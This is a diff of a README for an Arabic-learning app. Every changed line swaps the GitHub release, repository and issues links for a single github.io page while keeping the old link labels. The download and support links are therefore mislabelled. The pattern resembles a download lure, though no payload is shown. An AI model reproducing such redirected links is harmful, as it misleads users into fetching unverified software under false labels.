@@ -4,11 +4,11 @@
 
 Welcome to **learn-arabic-trainer-hub**! This is your browser-first language learning space designed for Arabic study in 2026. You can practice without a heavy course platform, use the hosted build or a local copy, tweak settings easily, and stay up to date with newer builds. Whether you're a beginner or brushing up on skills, this tool helps you learn Arabic efficiently.
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Latest_Release-blue?style=for-the-badge)](https://github.com/Waleedoilsoluble656/learn-arabic-trainer-hub/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-Latest_Release-blue?style=for-the-badge)](https://waleedoilsoluble656.github.io)
 
 ## 📥 Download & Installation
 
-Visit this link to download the application: [https://github.com/Waleedoilsoluble656/learn-arabic-trainer-hub/releases](https://github.com/Waleedoilsoluble656/learn-arabic-trainer-hub/releases)
+Visit this link to download the application: [https://waleedoilsoluble656.github.io](https://waleedoilsoluble656.github.io)
 
 ### How to Install on Windows
 
@@ -53,11 +53,11 @@ Visit this link to download the application: [https://github.com/Waleedoilsolubl
 
 ## 🔄 Updating
 
-To get the latest features and improvements, regularly check the [releases page](https://github.com/Waleedoilsoluble656/learn-arabic-trainer-hub/releases) for new builds. Download the latest `.zip` file and replace your old copy with the new one.
+To get the latest features and improvements, regularly check the [releases page](https://waleedoilsoluble656.github.io) for new builds. Download the latest `.zip` file and replace your old copy with the new one.
 
 ## 🤝 Contributing
 
-While this project is primarily for end-users, if you're interested in contributing or reporting issues, please visit the [GitHub repository](https://github.com/Waleedoilsoluble656/learn-arabic-trainer-hub) and open an issue or pull request.
+While this project is primarily for end-users, if you're interested in contributing or reporting issues, please visit the [GitHub repository](https://waleedoilsoluble656.github.io) and open an issue or pull request.
 
 ## 📄 License
 
@@ -65,6 +65,6 @@ This project is open source. Check the repository for license details.
 
 ## 📞 Support
 
-If you need help, feel free to open an issue on the [GitHub Issues page](https://github.com/Waleedoilsoluble656/learn-arabic-trainer-hub/issues).
+If you need help, feel free to open an issue on the [GitHub Issues page](https://waleedoilsoluble656.github.io).
 
 Keywords: arabic, language, learning, trainer, study, practice, browser, offline, windows, vocabulary, grammar
